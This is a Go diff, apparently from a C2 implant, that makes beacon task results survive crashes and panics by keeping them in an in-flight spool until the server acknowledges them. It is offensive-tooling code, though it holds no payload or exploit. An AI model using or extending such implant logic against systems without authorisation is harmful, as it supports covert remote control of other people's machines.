@@ -21,8 +21,14 @@ func requeuePendingBeacon(results []TaskResult, acks []uint) {
 	pendingMu.Lock()
 	pendingResults = append(results, pendingResults...)
 	pendingTaskAcks = append(acks, pendingTaskAcks...)
-	reenforcePendingBounds()
+	// The requeued results were the in-flight set; they are back in the queue
+	// now, so the spool snapshot must not count them twice.
+	inflightResults = nil
+	dropped := reenforcePendingBounds()
 	pendingMu.Unlock()
+	if dropped > 0 {
+		markPendingResultsDirty()
+	}
 }
 
 // noteBeaconFailure increments the backoff counter and returns unsent results
@@ -40,6 +46,10 @@ func noteBeaconFailure(resultsInFrame bool, results []TaskResult, acks []uint) {
 func doBeaconSafe() {
 	defer func() {
 		if r := recover(); r != nil {
+			// A panic in a handler or transport must not strand the results of
+			// this beacon in inflightResults, where no later frame would see
+			// them.
+			restoreInflightResults()
 			if Debug {
 				fmt.Printf("[!] beacon panic recovered: %v\n", r)
 			}
@@ -116,6 +126,9 @@ func doBeacon() {
 	pendingMu.Lock()
 	resultsCopy := pendingResults
 	acksCopy := pendingTaskAcks
+	// Keep the results part of the disk snapshot until the server answers, so
+	// a crash mid-beacon replays them rather than losing them.
+	inflightResults = resultsCopy
 	pendingResults = nil // sent
 	pendingTaskAcks = nil
 	pendingMu.Unlock()
@@ -391,6 +404,9 @@ func doBeacon() {
 		// keeps a long-running beacon on the current C2 endpoints, sleep values
 		// and malleable profile without re-registering.
 		applyServerNetworkConfig(resp.NetworkConfig)
+		// The reply decrypted, so the server processed this frame: the results
+		// carried by it no longer need to stay in the crash-recovery spool.
+		clearInflightResults()
 		beaconConsecutiveFailures = 0
 		// Fast-forward if the server is ahead of us (guards against a desync
 		// where our persisted sequence drifted behind the server's last_seq).
